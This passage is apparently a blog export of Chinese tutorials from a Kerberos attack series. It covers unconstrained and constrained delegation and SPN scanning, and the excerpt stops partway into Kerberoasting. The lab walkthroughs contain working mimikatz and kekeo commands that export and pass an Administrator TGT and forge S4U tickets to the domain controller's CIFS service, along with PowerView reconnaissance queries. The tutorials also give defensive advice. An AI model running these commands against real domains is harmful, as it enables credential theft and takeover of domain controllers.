TGT，为了方便我们称为TGT1）。\n2.KDC在KRB_AS_REP消息中返回TGT1。\n3.用户再通过TGT1向KDC请求转发TGT（forwarded TGT，我们称为TGT2）。\n4.在KRB_TGS_REP消息中返回转发TGT2。\n5.用户使用TGT1向KDC申请访问Service1的ST（Service Ticket）。\n6.TGS返回给用户一个ST。\n7.用户发送KRB_AP_REQ请求至Service1，这个请求中包含了TGT1和ST、TGT2、TGT2的SessionKey。\n8.Service1使用用户的TGT2通过KRB_TGS_REQ发送给KDC，以用户的名义请求能够访问Service2的票据。\n9.KDC在KRB_TGS_REP消息中返回Service2到Service1的票据。\n10.Service1以用户的名义像Service2发送KRB_AP_REQ请求。\n11.Service2响应步骤10中Service1的请求。\n12.Service1响应步骤7中用户的请求。\n13.在这个过程中的TGT转发机制，没有限制Service1对TGT2的使用，也就是说Service1可以通过TGT2来请求任意服务。\n14.KDC返回步骤13中请求的票据。\n15和16即为Service1通过模拟用户来访问其他Service。\n```\n\n可以看到在前5个步骤中User向KDC申请了两个TGT（步骤2和4），一个用于访问Service1一个用于访问Service2，并且会将这两个都发给Service1。并且Service1会将TGT2保存在内存中。\n\n**非约束委派的设置：**\n\nWindows域中可以直接在账户属性中设置：\n\n![1575808891534](Kerberos协议探索系列三委派篇.assets/1575808891534.png)\n\n## 2 约束委派\n\n由于非约束委派的不安全性，微软在windows2003中发布了约束委派的功能。约束委派在Kerberos中User不会直接发送TGT给服务，而是对发送给service1的认证信息做了限制，不允许service1代表User使用这个TGT去访问其他服务。这里包括一组名为S4U2Self（Service for User to Self）和S4U2Proxy（Service for User to Proxy）的Kerberos协议扩展。\n\n​         从下图可以看到整个过程其实可以分为两个部分，第一个是S4U2Self的过程（流程1-4），第二个是S4U2Proxy的过程（流程5-10）。\n\n![1575808898701](Kerberos协议探索系列三委派篇.assets/1575808898701.png)\n\n**流程：**\n\n```\n1.用户向Service1发送请求。\n2.这时在官方文档中的介绍是在这一流程开始之前Service1已经通过KRB_AS_REQ得到了用户用来访问Service1的TGT，然后通过S4U2self扩展模拟用户向KDC请求ST。\n3.KDC这时返回给Service1一个用于用户验证Service1的ST（我们称为ST1），并且Service1用这个ST1完成和用户的验证过程。\n4.Service1在步骤3使用模拟用户申请的ST1完成与用户的验证，然后响应用户。\n注：这个过程中其实Service1是获得了用户的TGT和ST1的，但是S4U2Self扩展不允许Service1代表用户去请求其他的服务。\n5.用户再次向Service1发起请求，此时Service1需要以用户的身份访问Service2。这里官方文档提到了两个点：\nA.Service1已经验证通过，并且有一个有效的TGT。\nB.Service1有从用户到Service1的forwardable ST（可转发ST）。个人认为这里的forwardable ST其实也就是ST1。\n6.Service1代表用户向Service2请求一个用于认证Service2的ST（我们称为ST2）。用户在ST1中通过cname（client name）和crealm（client realm）字段标识。\n7.KDC在接收到步骤6中Service1的请求之后，会验证PAC（特权属性证书，在第一篇中有说明）的数字签名。如果验证成功或者这个请求没有PAC（不能验证失败），KDC将返回ST2给Service1，不过这个ST2中cname和crealm标识的是用户而不是Service1。\n8.Service1代表用户使用ST2请求Service2。Service2判断这个请求来自已经通过KDC验证的用户。\n9.Service2响应Service1的请求。\n10.Service1响应用户的请求。\n```\n\n在这个过程中，S4U2Self扩展的作用是让Service1代表用户向KDC验证用户的合法性，并且得到一个可转发的ST1。S4U2Proxy的作用可以说是让Service1代表用户身份通过ST1重新获取ST2，并且不允许Service1以用户的身份去访问其他服务。更多的细节可以参考官方的文档，和RFC4120的内容。同时注意forwardable字段，有forwardable标记为可转发的是能够通过S4U2Proxy扩展协议进行转发的，如果没有标记则不能进行转发。\n\nhttps://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94\n\n**约束委派的配置：**\n\n可以在账户属性中将tsvc的委派方式更改为约束委派\n\n![1575809008741](Kerberos协议探索系列三委派篇.assets/1575809008741.png)\n\n# 0x02发现域中的委派主机或账户\n\n在域中，可以通过PowerView脚本来搜索开启了委派的主机和用户。查询非约束委派主要是通过搜索userAccountControl属性包含ADS_UF_TRUSTED_FOR_DELEGATION的主机或账户。而约束委派则通过查询userAccountControl属性包含TRUSTED_TO_AUTH_FOR_DELEGATION的主机或用户。\n\n## 1 非约束委派\n\n通过Import-Module PowerView.ps1加载PowerView脚本之后使用下面的命令进行查询。\n\n查询域中配置非约束委派的账户：\n\n```powershell\nGet-NetUser -Unconstrained -Domain yunying.lab\n```\n\n![1575809026517](Kerberos协议探索系列三委派篇.assets/1575809026517.png)\n\n查询域中配置非约束委派的主机：\n\n```powershell\nGet-NetComputer -Unconstrained -Domain yunying.lab\n```\n\n![1575809035908](Kerberos协议探索系列三委派篇.assets/1575809035908.png)\n\n在另一个版本的PowerView中采用的是Get-DomainComputer\n\n```powershell\nGet-DomainComputer -Unconstrained -Properties distinguishedname,useraccountcontrol -Verbose | ft -a\n```\n\n![1575809048647](Kerberos协议探索系列三委派篇.assets/1575809048647.png)\n\n## 2 约束委派\n\n查询域中配置约束委派的账户：\n\n```powershell\nGet-DomainUser –TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl\n```\n\n![1575809057419](Kerberos协议探索系列三委派篇.assets/1575809057419.png)\n\nGet-DomainUser -TrustedToAuth -Domain yunying.lab查看设置了约束委派的用户\n\n![1575809093932](Kerberos协议探索系列三委派篇.assets/1575809093932.png)\n\n查询域中配置约束委派的主机:\n\n```\nGet-DomainComputer -TrustedToAuth -Domain yunying.lab \n```\n\n![1575809105105](Kerberos协议探索系列三委派篇.assets/1575809105105.png)\n\n# 0x03非约束委派的利用\n\n上文中说明了两种委派方式，下面结合实验说明针对两种委派的利用方式。\n\n## 实验\n\n首先环境和前两篇文章相同。假设我们已经获取了一个已经配置了委派的账户权限或者是密码，现在我们通过这些条件来攻击其他账户。\n\n![1575809129124](Kerberos协议探索系列三委派篇.assets/1575809129124.png)\n\n**实验环境：**\n\n```\n域：YUNYING.LAB\n\n域控：Windows Server 2008 R2 x64(DC)：用户Administrator\n\n域内主机：Windows Server 2008 R2 x64(s2)：用户tsvc\n```\n\n**所需工具：**\n\n```\nMimikatz\n```\n\n**实验流程：**\n\n在域中只有服务账户才能有委派功能，所以先把用户tsvc设置为服务账号。\n\n```\nsetspn -U -A variant/golden tsvc\nsetspn -l tsvc    //查看配置\n```\n\n![1575809158083](Kerberos协议探索系列三委派篇.assets/1575809158083.png)\n\n然后在“AD用户和计算机”中将tsvc设置为非约束委派模式\n\n![1575809207912](Kerberos协议探索系列三委派篇.assets/1575809207912.png)\n\n此时在域控上使用Administrator访问tsvc所在主机S2的SMB服务。\n\n![1575809214590](Kerberos协议探索系列三委派篇.assets/1575809214590.png)\n\n我们在S2上通过mimikatz可以导出Administrator发送过来的TGT内容。这里需要使用管理员权限打开mimikatz，然后通过privilege::debug命令提升权限，如果没有提升权限会报kuhl_m_sekurlsa_acquireLSA错误。再使用sekurlsa::tickets /export命令导出内存中所有的票据。\n\n![1575809221653](Kerberos协议探索系列三委派篇.assets/1575809221653.png)\n\n可以看到名称为[0;9bec9]-2-0-60a00000-Administrator@krbtgt-YUNYING.LAB.kirbi的这一条即为Administrator发送的TGT。此时访问域控被拒绝：\n\n![1575809235084](Kerberos协议探索系列三委派篇.assets/1575809235084.png)\n\n通过kerberos::ptt [0;9bec9]-2-0-60a00000-Administrator@krbtgt-YUNYING.LAB.kirbi命令将TGT内容导入到当前会话中，其实这也是一次Pass The Ticket攻击（有兴趣的可以了解一下）。\n\n通过kerberos::list查看当前会话可以看到票据已经导入到当前会话。\n\n![1575809243927](Kerberos协议探索系列三委派篇.assets/1575809243927.png)\n\n导入之后已经可以访问域控的共享目录。也就是说每当存在用户访问tsvc的服务时，tsvc的服务就会将访问者的TGT保存在内存中，可以通过这个TGT访问这个TGT所属用户的所有服务。非约束委派的原理相对简单，就是通过获取到的administrator的TGT进行下一步的访问。\n\n这里有一个点就是sekurlsa::tickets是查看内存中所有的票据，而kerberos::list只是查看当前会话中的kerberos票据。更多的mimikatz的使用可以参考https://github.com/gentilkiwi/mimikatz/wiki\n\n**Print Spooler****服务****+****非约束委派提升至域控权限：**\n\n在2018年的DerbyCon中Will Schroeder（@ Harmj0y），Lee Christensen（@Tifkin_）和Matt Nelson（@ enigma0x3）提到了关于非约束委派的新方式，通过域控的Print Spooler服务和非约束委派账户提升至域控权限（https://adsecurity.org/?p=4056），主要的原理就是通过Print Spooler服务使用特定POC让域控对设置了非约束委派的主机发起请求，获取域控的TGT，从而提升权限。\n\n# 0x04约束委派的利用\n\n约束委派由于只指定了特定的服务，所以利用起来相对非约束委派更加复杂，本实验的条件是配置了约束委派的账号，并且已知当前配置了约束委派的当前账户的密码（tsvc的密码）。\n\n## 1 实验\n\n这里环境和上文中不变，依然使用普通域账号tsvc和域Administrator账户。不过增加了一个新的工具kekeo，他和mimikatz是同一个作者。\n\n1）、确认账号tsvc设置了约束委派。\n\n![1575809263853](Kerberos协议探索系列三委派篇.assets/1575809263853.png)\n\n通过工具PowerView的查询可以看到域内配置了约束委派的列表：\n\n![1575809269412](Kerberos协议探索系列三委派篇.assets/1575809269412.png)\n\n2）、使用kekeo对域控发起申请TGT的请求。\n\n通过已知的账户名和明文密码对KDC发起请求，得到TGT。\n\n![1575809286756](Kerberos协议探索系列三委派篇.assets/1575809286756.png)\n\n```\ntgt::ask /user:tsvc /domain:yunying.lab /password:admin1234! /ticket:tsvc.kirbi\n```\n\n```\n/user:当前用户名\n/domain:所在域名\n/password:当前用户名的密码\n/ticket:生成票据名称，上图里生成的没有按参数设定的来命名，不重要，也可以直接跳过这个参数\n```\n\n3）、使用kekeo申请TGS票据\n\n```\ntgs::s4u /tgt:TGT_filename /user:administrator@yunying.lab /service:cifs/dc.yunying.lab\n```\n\n```\n/tgt:上一步通过kekeo生成的tgt票据\n/user:想要伪造的用户名写全称（用户名@域名）\n/service:想要伪造访问的服务名（服务名/主机的FQDN名称）\n```\n\n![1575809323256](Kerberos协议探索系列三委派篇.assets/1575809323256.png)\n\n4）、从kekeo中使用exit命令退出，然后使用mimikatz将生成的TGS文件导入到Kerberos凭据列表中\n\n![1575809352572](Kerberos协议探索系列三委派篇.assets/1575809352572.png)\n\n这时可以看到导入之后已经能够成功访问域控的共享文件（严格来说应该是非约束委派中设置的SPN的权限）。而且在这个过程中是不需要管理员权限的，只是用当前账户的权限就可以完成，因为不需要从内存中导出票据。\n\n## 2 原理\n\n下面看一下在非约束委派中是如何实现通过非约束委派去获得所设置的SPN的权限的。实验过程其实主要是三个步骤：\n\n```\n1、请求TGT\n2、请求TGS\n3、将TGS导入内存\n```\n\n主要看1、2两个步骤，第1步中使用Kekeo发起AS-REQ请求去请求TGT。\n\n```\ntgt::ask /user:tsvc /domain:yunying.lab /password:admin1234! /ticket:tsvc.kirbi\n```\n\n![1575809381211](Kerberos协议探索系列三委派篇.assets/1575809381211.png)\n\n这时tsvc获取到了一个TGT，并且kekeo工具将其保存为一个kirbi格式的文件。\n\n第2步，再使用这个TGT申请两个ST文件，上文中说到过在约束委派实现的过程中分为两个部分，分别是S4U2Self扩展和S4U2Proxy扩展。S4U2Self中Service1会代替用户向KDC申请一张用于访问自身的TGS，这个TGS也就是生成的两个TGS中的一个（TGS_administrator@yunying.lab@YUNYING.LAB_tsvc@YUNYING.LAB.kirbi）还有一个TGS是用于访问非受限委派中设置的SPN的TGS（TGS_administrator@yunying.lab@YUNYING.LAB_cifs~dc.yunying.lab@YUNYING.LAB.kirbi）。\n\n![1575809394418](Kerberos协议探索系列三委派篇.assets/1575809394418.png)\n\n我们抓包也可以看到这里是发起了两次TGS_REQ请求，在第一个TGS_REQ请求的包里面可以看到KRB5-PADATA-S4U2SSELF的标识。并且cname和sname都是tsvc，也是侧面说明这个TGS其实就是拿来验证自身的。\n\n![1575809412197](Kerberos协议探索系列三委派篇.assets/1575809412197.png)\n\n再看第二个TGS_REQ请求，sname的值为cifs/dc.yunying.lab，也就是截图中非约束委派中“可由此账户提供委派凭据的服务”一栏中添加的SPN。而这个其实就是S4U2Proxy扩展中所申请的TGS票据。\n\n![1575809420426](Kerberos协议探索系列三委派篇.assets/1575809420426.png)\n\n![1575809429771](Kerberos协议探索系列三委派篇.assets/1575809429771.png)\n\n关于约束委派的这种攻击方式就是通过在Service1（tsvc）中将自己伪造成用户，然后获取允许约束委派的SPN的TGS的一个过程。\n\n# 0x05委派攻击的防御\n\n​         通过上文中说到设置了非约束委派的账户权限如果被窃取那么攻击者可能获取非常多其他账户的TGT，所以最好是不要在域中使用非约束委派这种功能。\n\n​         域中不需要使用委派的账户特别是administrator账户，设置为“敏感用户不能被委派”。\n\n![1575809444534](Kerberos协议探索系列三委派篇.assets/1575809444534.png)\n\n如果是win2012的系统也可以通过设置受保护的用户组来缓解委派所带来的危害。\n\n# 0x06总结\n\n在两种方式的委派中，非约束委派的实验获取的权限更大，能够通过TGT直接获取目标主机的所有服务权限，而约束委派实验主要是通过TGS来获取约束委派列表中设置的SPN的TGS来获得相应的SPN的权限。\n\n同时在今年有国外的安全人员提出来基于NTLMRelay和约束委派结合进行权限提升的攻击方式，详情可参考下面链接，此处不再赘述：\n\nhttps://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/\n\n这几篇文章也是通过实验来说明分析每一种Kerberos攻击方式的原理和如何实现，个人认为在Kerberos的攻击还是需要结合其他攻击方式才能发挥更大的作用，关于更多Kerberos的不同意见及看法欢迎留言交流，本文暂时到此完结，希望对你有所帮助。\n\n# 实验工具\n\nhttps://github.com/gentilkiwi/mimikatz/releases/tag/2.1.1-20181209\n\nhttps://github.com/gentilkiwi/kekeo/releases/\n\n# 参考链接\n\n参考链接：\n\nhttps://adsecurity.org/?p=1667\n\nhttps://xz.aliyun.com/t/2931#toc-6\n\nhttp://www.harmj0y.net/blog/activedirectory/s4u2pwnage/\n\nhttps://docs.microsoft.com/zh-cn/windows-server/security/credentials-protection-and-management/protected-users-security-group#BKMK_HowItWorks\n\nhttps://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/1fb9caca-449f-4183-8f7a-1a5fc7e7290a\n\nhttps://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/","categories":["RedTeam&域安全"]},{"title":"Kerberos协议探索系列一扫描与爆破篇","url":"/2020/12-18-Kerberos协议探索系列一扫描与爆破篇/","content":"\nFreebuf链接：https://www.freebuf.com/articles/system/196434.html\n\n# 0x00 前言\n​         Kerberos是一种由MIT（麻省理工大学）提出的一种网络身份验证协议。它旨在通过使用密钥加密技术为客户端/服务器应用程序提供强身份验证。\n\n在了解Kerberos的过程中，发现很多网站上的相关文章有一些是机器直接翻译过来的，也有一些写的比较优秀的文章，但是实操性比较弱，可能第一次了解Kerberos的同学会不知道怎么上手。所以本文主要是通过更详细的实验结合原理来说明与Kerberos相关的一些攻击手法。\n\n本文将分为三篇。第一篇也就是这一篇的内容主要包括域环境和Kerberos协议的说明以及Kerberoasting的攻击方式。第二篇主要包括MS14068漏洞和Kerberos票据的利用说明。第三篇的内容主要说明关于Kerberos委派的攻击方式及原理。\n\n![1575790019949](Kerberos协议探索系列之扫描与爆破篇.assets/1575790019949.png)\n\n# 0x01域环境\n\n由于Kerberos主要是用在域环境下的身份认证协议，所以在说之前先说下域环境的一些概念。首先域的产生是为了解决企业内部的资源管理问题，比如一个公司就可以在网络中建立一个域环境，更方便内部的资源管理。在一个域中有域控、域管理员、普通用户、主机等等各种资源。\n\n在下图中YUNYING.LAB为其他两个域的根域，NEWS.YUNYING.LAB和DEV.YUNYING.LAB均为YUNYING.LAB的子域，这三个域组成了一个域树。子域的概念可以理解为一个集团在不同业务上分公司，他们有业务重合的点并且都属于YUNYING.LAB这个根域，但又独立运作。同样TEST.COM也是一个单独的域树，两个域树YUNYING.LAB和TEST.COM组合起来被称为一个域林。\n\n![1575790053923](Kerberos协议探索系列之扫描与爆破篇.assets/1575790053923.png)\n\n本文就以根域为YUNYING.LAB的这个域来演示，YUNYING.LAB的域控是DC.YUNYING.LAB，子域NEWS.YUNYING.LAB和DEV.YUNYING.LAB的域控分别为NEWSDC.NEWS.YUNYING.LAB和DEVDC.DEV.YUNYING.LAB。\n\n上面说的都是FQDN(Fully Qualified Domain Name)名称，也就是全限定域名，是同时包含主机名和域名的名称。 \n\n例：DC.YUNYING.LAB中DC为主机名，域名为YUNYING.LAB，那他的FQDN名称就是DC.YUNYING.LAB。\n\n![1575790061352](Kerberos协议探索系列之扫描与爆破篇.assets/1575790061352.png)\n\n如何搭建域环境以及如何建立子域可参考网上的一些说明，这里放两个链接作为参考。\n\nhttps://jingyan.baidu.com/article/19192ad8e1593ae53e5707be.html\n\nhttp://blog.51cto.com/vbers/2058306\n\n本域中采用的操作系统为Windows Server 2008 R2+Windows 7。\n\n# 0x02Kerberos简介\n\n在Kerberos认证中，最主要的问题是如何证明“你是你”的问题，如当一个Client去访问Server服务器上的某服务时，Server如何判断Client是否有权限来访问自己主机上的服务，同时保证在这个过程中的通讯内容即使被拦截或篡改也不影响通讯的安全性，这正是Kerberos解决的问题。在域渗透过程中Kerberos协议的攻防也是很重要的存在。\n\n## 1 Kerberos协议框架\n\n在Kerberos协议中主要是有三个角色的存在：\n\n```\n1、  访问服务的Client\n2、  提供服务的Server\n3、  KDC（Key Distribution Center）密钥分发中心\n```\n\n其中KDC服务默认会安装在一个域的域控中，而Client和Server为域内的用户或者是服务，如HTTP服务，SQL服务。在Kerberos中Client是否有权限访问Server端的服务由KDC发放的票据来决定。\n\n![1575790079578](Kerberos协议探索系列之扫描与爆破篇.assets/1575790079578.png)\n\n如果把Kerberos中的票据类比为一张火车票，那么Client端就是乘客，Server端就是火车，而KDC就是就是车站的认证系统。如果Client端的票据是合法的（由你本人身份证购买并由你本人持有）同时有访问Server端服务的权限（车票对应车次正确）那么你才能上车。当然和火车票不一样的是Kerberos中有存在两张票，而火车票从头到尾只有一张。\n\n由上图中可以看到KDC又分为两个部分：\n\n**Authentication Server**： AS的作用就是验证Client端的身份（确定你是身份证上的本人），验证通过就会给一张TGT（Ticket Granting Ticket）票给Client。\n\n**Ticket Granting Server**： TGS的作用是通过AS发送给Client的票（TGT）换取访问Server端的票（上车的票ST）。ST（Service Ticket）也有资料称为TGS Ticket，为了和TGS区分，在这里就用ST来说明。\n\n![1575790094962](Kerberos协议探索系列之扫描与爆破篇.assets/1575790094962.png)\n\nKDC服务框架中包含一个KRBTGT账户，它是在创建域时系统自动创建的一个账号，可以暂时理解为他就是一个无法登陆的账号。\n\n![1575790101492](Kerberos协议探索系列之扫描与爆破篇.assets/1575790101492.png)\n\n## 2 Kerberos认证流程\n\n当Client想要访问Server上的某个服务时，需要先向AS证明自己的身份，然后通过AS发放的TGT向Server发起认证请求，这个过程分为三块：\n\n**The Authentication Service Exchange**：Client与AS的交互\n\n**The Ticket-Granting Service (TGS) Exchange**：Client与TGS的交互\n\n**The Client/Server Authentication Exchange**：Client与Server的交互\n\n![1575790110285](Kerberos协议探索系列之扫描与爆破篇.assets/1575790110285.png)\n\n### (1)The Authentication Service Exchange\n\n#### KRB_AS_REQ\n\nClient->AS：发送 Authenticator1(Client密码加密TimeStamp)\n\n​         第一步Client先向KDC的AS发送Authenticator1，内容为通过Client密码Hash加密的时间戳、Client ID、网络地址、加密类型等内容。\n\n![1575790116273](Kerberos协议探索系列之扫描与爆破篇.assets/1575790116273.png)\n\n#### KRB_AS_REP\n\nAS-> Client：发送Client密码加密的sessionkey-as 和票据TGT(KRBTGT HASH加密的sessionkey-as和TimeStamp)\n\n​         在KDC中存储了域中所有用户的密码HASH，当AS接收到Client的请求之后会根据KDC中存储的密码来解密，解密成功并且验证信息。验证成功后返回给Client由Client密码HASH加密的sessionkey-as和TGT（由KRBTGT HASH加密的sessionkey-as和TimeStamp等信息）。\n\n### (2)The Ticket-Granting Service (TGS) Exchange\n\n#### KRB_TGS_REQ\n\nClient ->TGS 发送 Authenticator2 (sessionkey-as加密TimeStamp) 和 票据TGT(KRBTGT HASH加密的sessionkey-as和TimeStamp)\n\n​         Client接收到了加密后的Sessionkey-as和TGT之后，用自身密码解密得到Sessionkey-as，TGT是由KDC密码加密，Client无法解密。这时Client再用Sessionkey-as加密TimeStamp和TGT一起发送给KDC中的TGS（Ticket Granting Server）票据授权服务器换取能够访问Server的票据。\n\n![1575790143581](Kerberos协议探索系列之扫描与爆破篇.assets/1575790143581.png)\n\n#### KRB_TGS_REP\n\nTGS-> Client发送 密文1(sessionkey-as加密sessionkey-tgs) 和 票据ST(Server密码HASH加密sessionkey-tgs)\n\n​         TGS收到Client发送过来的TGT和Sessionkey-as加密的TimeStamp之后，首先会检查自身是否存在Client所请求的服务。如果服务存在，则用KRBTGT密码解密TGT。一般情况下TGS会检查TGT中的时间戳查看TGT是否过期，且原始地址是否和TGT中保存的地址相同。验证成功之后将用sessionkey-as加密的sessionkey-tgs和Server密码HASH加密的Sessionkey-tgs发送给Client。\n\n### (3)The Client/Server Authentication Exchange\n\n#### KRB_AP_REQ\n\nClient ->Server 发送 Authenticator3(sessionkey-tgs加密TimeStamp) 和 票据ST(Server密码HASH加密sessionkey-tgs)\n\nClient收到sessionkey-as加密的sessionkey-tgs和Server密码HASH加密的sessionkey-tgs之后用sessionkey-as解密得到sessionkey-tgs，然后把sessionkey-tgs加密的TimeStamp和ST一起发送给Server。\n\n![1575790151791](Kerberos协议探索系列之扫描与爆破篇.assets/1575790151791.png)\n\n#### KRB_AP_REP\n\nServer-> Client\n\nserver通过自己的密码解密ST，得到sessionkey-tgs,再用sessionkey-tgs解密Authenticator3得到TimeStamp，验证正确返回验证成功。\n\n这就是Kerberos认证的流程，篇幅所限所以尽量简化说明，更详细的信息可以参考下面链接。\n\nhttps://tools.ietf.org/html/rfc4120.html\n\n## 3 PAC \n\n在Kerberos最初设计的几个流程里说明了如何证明 Client是Client而不是由其他人来冒充的，但并没有声明Client有没有访问Server服务的权限，因为在域中不同权限的用户能够访问的资源是有区别的。\n\n所以微软为了解决这个问题在实现Kerberos时加入了PAC的概念，PAC的全称是Privilege Attribute Certificate(特权属性证书)。可以理解为火车有一等座，也有二等座，而PAC就是为了区别不同权限的一种方式。\n\n### (1)PAC的实现\n\n当用户与KDC之间完成了认证过程之后， Client需要访问Server所提供的某项服务时， Server为了判断用户是否具有合法的权限需要将Client的User SID等信息传递给KDC， KDC通过SID判断用户的用户组信息， 用户权限等， 进而将结果返回给Server， Server再将此信息与用户所索取的资源的ACL进行比较， 最后决定是否给用户提供相应的服务。\n\nPAC会在KRB_AS_REP中AS放在TGT里加密发送给Client，然后由Client转发给TGS来验证Client所请求的服务。\n\n在PAC中包含有两个数字签名PAC_SERVER_CHECKSUM和PAC_PRIVSVR_CHECKSUM，这两个数字签名分别由Server端密码HASH和KDC的密码HASH加密。\n\n同时TGS解密之后验证签名是否正确，然后再重新构造新的PAC放在ST里返回给客户端，客户端将ST发送给服务端进行验证。\n\n### (2)Server与KDC\n\nPAC可以理解为一串校验信息，为了防止被伪造和串改，原则上是存放在TGT里，并且TGT由KDC hash加密。同时尾部会有两个数字签名，分别由KDC密码和server密码加密，防止数字签名内容被篡改。\n\n![1575790171613](Kerberos协议探索系列之扫描与爆破篇.assets/1575790171613.png)\n\n同时PAC指定了固定的User SID和Groups ID，还有其他一些时间等信息，Server 的程序收到ST之后解密得到PAC会将PAC的数字签名发送给KDC，KDC再进行校验然后将结果已RPC返回码的形式返回给Server。\n\n![1575790210375](Kerberos协议探索系列之扫描与爆破篇.assets/1575790210375.png)\n\n# 0x03 Kerberos与SPN\n\n## 1 SPN简介\n\n服务主体名称（SPN：Service Principal Names）是服务实例（可以理解为一个服务，比如HTTP、MSSQL）的唯一标识符。Kerberos身份验证使用SPN将服务实例与服务登录帐户相关联。如果在整个林或域中的计算机上安装多个服务实例，则每个实例都必须具有自己的SPN。如果客户端可能使用多个名称进行身份验证，则给定服务实例可以具有多个SPN。SPN始终包含运行服务实例的主机的名称，因此服务实例可以为其主机的每个名称或别名注册SPN。\n\n如果用一句话来说明的话就是如果想使用Kerberos协议来认证服务，那么必须正确配置SPN。\n\n## 2 SPN格式与配置：\n\n在SPN的语法中存在四种元素，两个必须元素和两个额外元素，其中<service class>和<host>为必须元素：\n\n```\n<service class>/<host>:<port>/<service name>\n<service class>：标识服务类的字符串\n<host>：服务所在主机名称\n<port>：服务端口\n<service name>：服务名称\n```\n\n例：\n\n如果我想把域中一台主机S2中的MSSQL服务注册到SPN中则可以使用命令Setspn -A MSSQLSvc/s2.yunying.lab:1433 tsvc\n\n![1575790233310](Kerberos协议探索系列之扫描与爆破篇.assets/1575790233310.png)\n\n注册成功之后可以通过命令setspn -T yunying.lab –q */*或者setspn –q */*来查看已经注册的SPN。SPN在其注册的林中必须是唯一的。如果它不唯一，则身份验证将失败。\n\n在注册SPN时，可以使用NetBIOS名称，如s2。也可以使用FQDN(Fully Qualified Domain Name全限定域名) ，如s2.yunying.lab。有可能存在某一种名称注册的SPN不能成功访问的情况，如果没有配置正确可以换一种名称试一试。\n\n![1575790240799](Kerberos协议探索系列之扫描与爆破篇.assets/1575790240799.png)\n\n一般情况下基于主机的服务会省略后面两个组件，格式为<service class>/<host>：\n\n```\nMSSQLSvc/s2.yunying.lab\n```\n\n如果服务使用非默认端口或者此主机存在多个服务实例的情况下，需要包括端口号或服务名：\n\n```\nMSSQLSvc/ s2.yunying.lab:1433\n```\n\n## 3 SPN扫描\n\n在了解了Kerberos和SPN之后我们可以通过SPN来获取我们想要的信息，比如想知道域内哪些主机安装了什么服务，我们就不需要再进行批量的网络端口扫描。在一个大型域中通常会有不止一个的服务注册SPN，所以可以通过“SPN扫描”的方式来查看域内的服务。相对于通常的网络端口扫描的优点是不用直接和服务主机建立连接，且隐蔽性更高。\n\n### (1)扫描工具\n\n扫描工具有多种，下面挑选几种较为常见的工具来说明一下：\n\nDiscover-PSMSSQLServers：\n\nDiscover-PSMSSQLServers是Powershell-AD-Recon工具集中的一个工具，用来查询已经注册了的MSSQL类型的SPN。\n\n![1575790278371](Kerberos协议探索系列之扫描与爆破篇.assets/1575790278371.png)\n\nGetUserSPNs：\n\nGetUserSPNs是Kerberoast工具集中的一个powershell脚本，用来查询域内注册的SPN。\n\n![1575790286446](Kerberos协议探索系列之扫描与爆破篇.assets/1575790286446.png)\n\nPowerView：\n\nPowerView是由Will Schroeder（https://twitter.com/harmj0y）开发的Powershell脚本，在Powersploit和Empire工具里都有集成，PowerView相对于上面几种是根据不同用户的objectsid来返回，返回的信息更加详细。\n\n![1575790296090](Kerberos协议探索系列之扫描与爆破篇.assets/1575790296090.png)\n\n还有一些其他的脚本，使用方法基本类似，可以自己选择合适的工具使用，而且GitHub上面大多数都有下载链接。\n\n### (2)原理说明\n\n在SPN扫描时我们可以直接通过脚本，或者命令去获悉内网已经注册的SPN内容。那如果想了解这个过程是如何实现的，就需要提到LDAP协议。\n\nLDAP协议全称是Lightweight Directory Access Protocol，一般翻译成轻量目录访问协议。是一种用来查询与更新 Active Directory 的目录服务通信协议。AD 域服务利用 LDAP 命名路径（LDAP naming path）来表示对象在 AD 内的位置，以便用它来访问 AD 内的对象。\n\nLDAP 数据的组织方式：\n\n![1575790307017](Kerberos协议探索系列之扫描与爆破篇.assets/1575790307017.png)\n\n更直观的说可以把LDAP协议理解为一个关系型数据库，其中存储了域内主机的各种配置信息。\n\n在域控中默认安装了ADSI编辑器，全称Active Directory Service Interfaces Editor (ADSI Edit)，是一种LDAP的编辑器，可以通过在域控中运行adsiedit.msc来打开（服务器上都有，但是只有域控中的有整个域内的配置信息）。\n\n![1575790322424](Kerberos协议探索系列之扫描与爆破篇.assets/1575790322424.png)\n\n通过adsiedit.msc我们可以修改和编辑LADP，在SPN查询时实际上就是查询LADP中存储的内容。\n\n比如在我们是实验环境域YUNYING.LAB中，存在名为svcserver的一个OU（Organization Unit，可以理解为一个部门，如开发部、财务部等等），其中包含了tsvc这个用户，从用户属性中可以看到tsvc注册过的SPN内容。\n\n![1575790331393](Kerberos协议探索系列之扫描与爆破篇.assets/1575790331393.png)\n\n当我们在一台主机执行setspn -T yunying.lab -q */*命令查询域内SPN时，通过抓包可以看到正是通过LDAP协议向域控中安装的LDAP服务查询了SPN的内容。\n\n![1575790342390](Kerberos协议探索系列之扫描与爆破篇.assets/1575790342390.png)\n\n所以其实那些Powershell脚本其实主要就是通过查询LDAP的内容并对返回结果做一个过滤，然后展示出来。\n\n# 0x04 Kerberoasting\n\n在前面介绍Kerberos的认证流程时说到，在KRB_TGS _REP中，TGS会返回给Client一张票据ST，而ST是由Client请求的Server端密码进行加密的。当Kerberos协议设置票据为RC4方式加密时，我们就可以通过爆破在Client端获取的票据ST，从而获得Server端的密码。\n\n下图为设置Kerberos的加密方式，在域中可以在域控的“组策略管理”中进行设置：\n\n![1575790354153](Kerberos协议探索系列之扫描与爆破篇.assets/1575790354153.png)\n\n设置完成之后运行里输入“gpupdate”刷新组策略，策略生效。\n\n## 1 早期的Kerberoasting\n\nKerberoasting这种攻击方式最初应该是由TimMedin（https://twitter.com/TimMedin）提出，下面我们通过实验来进行演示。\n\n**实验环境：**\n\n```\n域：YUNYING.LAB\n域控：Windows Server 2008 R2 x64(DC)\n域内主机：Windows 7 x64(s1):用户ts1\n域内主机：Windows Server 2008 R2 